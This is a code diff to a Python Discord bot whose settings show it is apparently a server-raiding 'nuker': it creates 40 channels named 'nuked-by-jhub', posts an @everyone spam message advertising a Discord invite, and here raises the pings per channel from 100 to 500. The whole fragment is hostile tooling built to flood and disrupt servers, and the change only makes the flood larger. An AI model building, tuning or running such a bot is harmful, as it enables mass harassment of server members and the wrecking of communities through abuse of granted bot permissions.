@@ -8,7 +8,7 @@ prefix = "!"
 channel_name = "nuked-by-jhub"
 spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
 channels_to_create = 40
-pings_per_channel = 100
+pings_per_channel = 500
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=prefix, intents=intents)
